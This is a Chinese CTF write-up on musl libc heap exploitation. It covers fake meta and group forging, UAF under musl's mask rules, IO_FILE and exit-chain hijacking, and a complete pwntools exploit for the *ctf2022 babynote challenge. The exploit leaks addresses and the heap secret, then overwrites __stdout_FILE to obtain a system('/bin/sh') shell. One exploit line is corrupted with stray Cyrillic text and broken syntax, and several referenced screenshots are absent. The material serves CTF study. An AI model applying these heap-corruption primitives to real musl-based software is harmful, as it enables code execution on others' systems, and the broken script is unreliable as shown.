
## 伪造 meta

### 伪造 dequeue meta
```python
last_idx, freeable, sc, maplen = 0, 1, 8, 1  # fake meta
fake_meta = p64(stdout - 0x18)  # prev
fake_meta += p64(fake_meta_addr + 0x30)  # next
fake_meta += p64(fake_mem_addr)  # mem
fake_meta += p32(0) + p32(0)  # avail_mask, freed_mask
fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
fake_meta += p64(0)  # duiqi
```

### 伪造 queue meta
```python
last_idx, freeable, sc, maplen = 1, 0, 8, 0  # freeable置0是为了拒绝ok to free校验，防止释放meta
fake_meta = p64(0)  # prev
fake_meta += p64(0)  # next
fake_meta += p64(fake_mem_addr)  # mem
fake_meta += p32(0) + p32(0)  # avail_mask, freed_mask
fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
fake_meta += p64(0)
```

### 伪造 group
```python
fake_mem = p64(fake_meta_addr)  # meta
fake_mem += p32(1) + p32(0)
```

### 拼接 payload
```python
payload = padding  # 页对齐
payload += p64(secret) + p64(0)  # +p64(0)是为了补齐
payload += fake_meta + b'\n'
```

## UAF

### 效果
任意地址泄露或者任意地址写

### 利用过程
musl的UAF和glibc的有点不太一样，这是因为musl的堆块free过后不会立马被再次使用。这是由meta的`avail_mask`和`freed_mask`限制的。申请group对应大小的堆块，会优先使用`avail_mask`上还是1的位置对应的堆块。当`avail_mask`变成0了会检测`freed_mask`是否为0，如果为0则该meta可以dequeue了，即`malloc`触发的dequeue，反之则会将`avail_mask`异或上`freed_mask`同时将`freed_mask`置为0，取出当前`avail_mask`从低到高第一个非0位对应的堆块作为`malloc`或者其它内存申请函数的返回值，并将该位置为0

所以，musl的堆题处处充满了风水。举个栗子：
注意`avail_mask`和`freed_mask`，idx为1即`group`的第二个的chunk此时是free状态，但是我们申请的话，其实是申请到idx为9的堆块。这就是musl管理chunk和glibc不太一样的地方，相应的UAF利用，比如idx为1的堆块存在UAF，我们想构造它既是note又是note上的关键位置，比如`content`这类能通过`show`函数输出泄露的地方，就只能等先取出idx为9的堆块才能申请出它了。

## IO_attack
musl没有glibc的大多hook，但有我们pwn人最喜欢的`IO_FILE`。下面给出一条链子供参考：
`puts` -> `fputs_unlocked` -> `fwrite_unlocked` -> `__fwritex+142` `call rax`

这里的`rax`是通过`r12`赋值的：
```asm
mov rax, qword ptr [r12 + 0x48]
call rax
```
而`r12`: `R12 0x7ffff7ffb280 (__stdout_FILE)` ◂— `0x68732f6e69622f` `/*'/bin/sh'* /`

那我们就可以利用meta dequeue&queue实现任意地址写`__stdout_FILE`

伪造的`IO_FILE`模板如下：
```python
fake_IO = b'/bin/sh\x00'                       # flags
fake_IO += p64(0)  # rpos
fake_IO += p64(0)  # rend
fake_IO += p64(libc_base + 0x5c9a0)  # close
fake_IO += p64(1)  # wend
fake_IO += p64(0)  # wpos
fake_IO += p64(0)  # mustbezero_1
fake_IO += p64(0)  # wbase
fake_IO += p64(0)  # read
fake_IO += p64(libc_base + libc.sym['system'])  # write
```
其实就改了三个点，`flags`，`wend`和`write`。原来的长这样：
改`wend`其实是因为在`call rax`之前还有这个检查：

## exit_attack
同样给出一条参考链子：
`exit` -> `stdio_exit_needed` -> `stdio_exit_needed` -> `close_file`

最后的`close_file`长这样：
最终执行的是`call [rbp+0x48]`，在`call`之前贴心的把`edx`和`esi`给清空了，简直是给`execve`函数量身定制的。`rdi`是`rbp`，是在这个地方赋值的：
只要劫持`ofl_head`为一个可控的结构体，堆块或`bss`，在上面赋值就可以`getshell`。这样只需要meta dequeue的一次任意地址写并且函数里有`exit`就能`getshell`了

## 例题：`*ctf2022` babynote

### 版本
`./libc.so`即可查看`libc`版本：

### 保护

### ida

#### main
实现了增删查三种功能

#### add
熟悉的结构题，通过`calloc`申请`0x20`大小的`note`：
`name`和`content`都是自定大小的`calloc`堆块，黄色箭头的是`chain`上的`note`。这里的`chain`其实指这题的`note`之间是通过链表连起来的，有一个全局链表头`global_note`。通过头插法插入`note`

#### find 也就是 show
这个函数的流程大体如下：
读入`size`和`key`，通过`list_pass`遍历`chain`，找到`name_size`和读入的`size`相同且`name`和`key`相同的`note`，返回给`v3`。然后通过大端序列显示`v3`的内容：

#### delet
也是通过`list_pass`寻找和输入的`key`以及`size`对应的`note`。重点放在下面的`if`和`else`分支，发现只有`else`分支会清除指针，`if`分支不会，也就是说当`chain`中的`note`不少于两个的时候就会存在UAF。通过这个UAF我们能创造一个既是`note`记为A，同时也是一个`note`的`content`记为B的堆块，然后通过`find`打印B的`content`即可泄露`libcbase`和`elfbase`。由于musl libc的堆是静态堆，也就相当于泄露了堆地址，`elfbase`和`heapbase`泄露一个就行，这点和glibc是不一样的

利用流程：
已知存`size`为`0x30`的`group`最多能存10个堆块`0~9`
1. 通过`find`的`calloc`和`free`二连将`avail_mask`设置成`0b1000000000`，`free_mask`设置为`0b0111111110`：
2. 通过`add` `namesize=xxx,contentsize=0x28`将`globa_note`设置为`B(idx=9)`，同时B的`content`将被设置为`A(idx=1)`
3. `delet B` 同时A也会被删除，因为`delet`也会删除`content`，通过`add`更新A的`name`和`content`
4. 通过`find show B`的`content`，即可泄露`libcbase`和`elfbase`
由于泄露是大端自序泄露，所以需要特殊的手法来操作exp接收的字符：
```python
libcbase = u64(p64(int(r.recv(16),16),endianness="big")) - 0xb7d60
```
后面还可以利用这个特性，通过`find`直接修改B的`content`为`__malloc_context`泄露`secret`任意地址泄露；或是改成合法的`chunk`任意地址`free`

#### forget

### 利用思路
1. 通过UAF泄露`elfbase`和`libcbase`以及`secret`
2. 然后申请大堆块在`mmap`的内存段布置好`fake meta`
3. 通过任意`free`，执行`dequeue`使得`target-0x10`为`fake meta`的地址；执行`queue`将`fake meta`放入`active[sc]`
4. `calloc(sc*0x10)`申请出`stdout_file`进行修改从而劫持`puts`函数的io执行流为`system("/bin/sh")`getshell

### exp
```python
# -*- coding: utf-8 -*-
from platform import libc_ver
from pwn import *
from hashlib import sha256
import base64
context.log_level='debug'
context.arch = 'amd64'
context.os = 'linux'
io = lambda : r.interactive()
sl = lambda a : r.sendline(a)
sla = lambda a,b : r.sendlineafter(a,b)
se = lambda a : r.send(a)
sa = lambda a,b : r.sendafter(a,b)
lg = lambda name,data : log.success(name+":"+hex(data))

def z():
    gdb.attach(r)

def cho(num):
    sla("option: ",str(num))

def add(namesz,name,notesz,note):
    cho(1)
    sla("name size: ",str(namesz))
    sa("name: ",name)
    sla("note size: ",str(notesz))
    sa("note content: ",note)

def find(namesz,name):
    cho(2)
    sla("name size: ",str(namesz))
    sa("name: ",name)

def delet(namesz,name):
    cho(3)
    sla("name size: ",str(namesz))
    sa("name: ",name)

def remake():
    cho(4)

def exp():
    global r
    global libc
    r=process("./babynote")
    libc=ELF('./libc.so')
    ## leak libcbase && elfbase
    add(0x38,"a"*0x38,0x38,"a"*0x38)
    cho(4)
    for _ in range(8):
        find(0x28,"a"*0x28)
        add(0x38,"2"*0x38,0x28,"2"*0x28)
        add(0x38,"3"*0x38,0x38,"3"*0x38)
        delet(0x38,"2"*0x38)
    for _ in range(6):
        find(0x28,"a"*0x28)
        add(0x38,"4"*0x38,0x58,"4"*0x58)
        find(0x38,"2"*0x38)
        r.recvuntil("0x28:")
        libcbase=u64(p64(int(r.recv(16),16),endianness="big")) - 0xb7d60
        elfbase=u64(p64(int(r.recv(16),16),endianness="big")) - 0x4c40
        log.success("libcbase:"+hex(libcbase))
        log.success("elfbase:"+hex(elfbase))
    ## set libcfunc
    malloc_context = libcbase + 0xb4ac0
    mmap_base = libcbase - 0xa000
    fake_meta_addr = mmap_base + 0x2010
    fake_mem_addr = mmap_base + 0x2040
    stdout = libcbase + 0xb4280
    ## leak secret
    for _ in range(6):
        find(0x28,"a"*0x28)
        pd=p64(elfbase+0x4fc0)+p64(malloc_context)+p64(0x38)+p64(0x28)+p64(0)
        find(0x28,pd)
        find(0x38,"a"*0x38)
        r.recvuntil("0x28:")
        secret=u64(p64(int(r.recv(16),16),endianness="big"))
        lg("secret",secret)
    ## set fake meta
    add(0x28,"5"*0x28,0x1200,'\n')
    last_idx, freeable, sc, maplen = 0,1,8,1
    fake_meta = p64(stdout-0x18)
    fake_meta += p64(fake_meta_addr+0x30)
    fake_meta += p64(fake_mem_addr)
    fake_meta += p32(0)+p32(0)
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
    fake_meta += p64(0)
    fake_mem = p64(fake_meta_addr)
    fake_mem += p32(1)+p32(0)
    payload = b'a'*0xaa0
    payload += p64(secret)+p64(0)
    payload += fake_meta + fake_mem + '\n'
    find(0x1200,payload)
    ## dequeue 2 set stdout_file -0x10
    for _ in range(3):
        find(0x28,"a"*0x28)
        pd=p64(elfbase+0x4fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0)
        add(0x38,"6"*0x38,0x28,pd)
        delet(0x38,"a"*0x38)
    ## reset fake meta , free fake chunk 2 queue it
    last_idx, freeable, sc, maplen = 1,0,8,0
    fake_meta = p64(0)
    fake_meta += p64(0)
    fake_meta += p64(fake_mem_addr)
    fake_meta += p32(0)+p32(0)
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
    fake_meta += p64(0)
    fake_mem = p64(fake_meta_addr)
    fake_mem += p32(1)+p32(0)
    payload = b'a'*0xa90
    payload += p64(secret)+p64(0)
    payload += fake_meta + fake_mem + b'\n'
    find(0x1200, payload)
    for _ in range(2):
        find(0x28,'a'*0x28)
        pd=p64(elfbase+0x5fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0)
        add(0x38,"7"*0x38,0x28,pd)
        delet(0x38,"a"*0x38)
    ## reset fake meta's group at stdout_file -0x10
    last_idx, freeable, sc, maplen = 1,0,8,0
    fake_meta = p64(fake_meta_addr)
    fake_meta += p64(fake_meta_addr)
    fake_meta += p64(stdout-0x10)
    fake_meta += p32(1)+p32(0)
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
    fake_meta += b'a'*0x18
    fake_meta += p64(stdout-0x10)
    payload = b'a'*0xa80
    payload += p64(secret)+p64(0)
    payload += fake_meta + b'\n'
    find(0x1200, payload)
    ## calloc to edit stdout 2 IO_attack
    cho(1)
    sla('name size: ',str(0x28))
    sa('name: 'ода '\n')
    sla('note size: ',str(0x80))
    fake_IO = b'/bin/sh\x00'
    fake_IO += p64(0)
    fake_IO += p64(0)
    fake_IO += p64(libcbase+0x5c9a0)
    fake_IO += p64(1)
    fake_IO += p64(0)
    fake_IO += p64(0)
    fake_IO += p64(0)
    fake_IO += p64(0)
    fake_IO += p64(libcbase+libc.sym['system'])
    sl(fake_IO)
    io()

if __name__ == '__main__':
    exp()
```

### 不足之处
dequeue和queue的触发不止free这种，但笔者精力有限没能全部研究透彻。不过比起glibc，musl的libc真的缩减了很多，属于是那种比赛的时候可以现找漏洞点的。所以没涉及的地方就交给读者自行研究了，感谢阅读~

## 参考链接
感谢`xyzmpv`师傅的题解以及`0xRGz`师傅的musl源码解析~
